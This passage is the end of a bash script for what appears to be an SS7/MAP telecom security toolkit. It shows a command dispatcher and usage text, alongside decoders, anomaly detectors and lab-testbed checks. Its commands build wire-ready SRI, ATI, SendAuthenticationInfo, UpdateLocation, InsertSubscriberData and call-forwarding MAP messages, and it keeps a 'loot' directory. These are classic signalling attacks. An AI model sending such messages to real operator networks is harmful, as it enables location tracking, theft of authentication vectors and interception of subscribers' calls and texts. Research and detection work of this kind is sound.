        --build-isd)         ss7_cmd_build_extra isd "${1:-}" ;;
        --build-register-ss) ss7_cmd_build_extra register-ss "${1:-}" "${2:-}" ;;
        --build-activate-ss) ss7_cmd_build_extra activate-ss "${1:-}" ;;
        --flow)          ss7_cmd_flow "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-}" ;;
        --grx-recon)     ss7_grx_recon "${1:-}" ;;
        --detect)        ss7_cmd_detect "${1:-}" ;;
        --visited-plmn)  ss7_visited_plmn "${1:-}" ;;
        --fallback-detect) ss7_fallback_detect "${1:-}" ;;
        --ssn)           ss7_cmd_ssn "${1:-}" ;;
        --opcode)        ss7_cmd_opcode "${1:-}" ;;
        --pc-format)     ss7_cmd_pc "${1:-}" "${2:-3-8-3}" ;;
        --surface)       ss7_surface_notes ;;
        --require-stp)   ss7_require_stp ;;
        --plan)          ss7_cmd_plan "${1:-}" ;;
        --selftest)      ss7_selftest ;;
        --menu)          ss7_menu ;;
        *)
            cat >&2 <<EOF
SS7 / MAP — signalling interconnect, TCAP/MAP codec, GRX and IPX

Usage: $0 COMMAND
  --status-tsv               module state as TSV
  --decode-msu <hex>         walk MTP3 and SCCP in a full MSU
  --decode-tcap <hex>        parse TCAP transaction + component portions
  --decode-map <hex>         decode MAP, unwrapping MSU or SCCP if present
  --build-sri <msisdn>       build a wire-ready SRI MSU
  --build-sri-sm <msisdn>    build a wire-ready SRI-SM MSU
  --build-ati <imsi>         build a wire-ready ATI MSU
  --build-sai <imsi> [n]     build a SendAuthenticationInfo MSU (n vectors, default 5)
  --build-psi <imsi>         build a ProvideSubscriberInfo MSU
  --build-ulr <imsi> [msc] [vlr]
                             build an UpdateLocation MSU
  --build-isd <imsi>         build an InsertSubscriberData MSU
  --build-register-ss [ss-code] [forwarded-number]
                             build a RegisterSS MSU (default cfu, code 33)
  --build-activate-ss [ss-code]
                             build an ActivateSS MSU (default cfu, code 33)
  --decode-sigtran <hex>     strip SCTP + M3UA and decode the carried MSU
  --build-m3ua <msu-hex> [routing-context] [network-appearance]
                             wrap an MSU in a send-ready M3UA DATA message; the
                             MSU carries its own SIO and routing label, so the
                             optional arguments add M3UA routing rather than
                             restating the point codes
  --flow <name> [msisdn] [imsi] [opc] [dpc]
                             print the published flow as real message steps
  --grx-recon [pcap]         GRX/IPX trust model, or harvest peers from a pcap
  --detect <pcap>            HLR-side anomaly detection over a capture
  --visited-plmn <hex>       decode a Diameter Visited-PLMN-Id; flag the 0000 spoof
  --fallback-detect <tsv>    Diameter->SS7 fallback pivot detection
  --ssn <n>                  subsystem number -> name
  --opcode <n>               MAP operation code -> name
  --pc-format <pc> [struct]  14-bit point code in a structured form
  --surface                  attack surface notes
  --require-stp              report the lab STP, by name if absent
  --plan <stp-lab|ipx-path>  write a handed-off plan naming the testbed
  --selftest                 verify codecs against known answers
  --menu                     interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    ss7_cli_main "$@"
fi
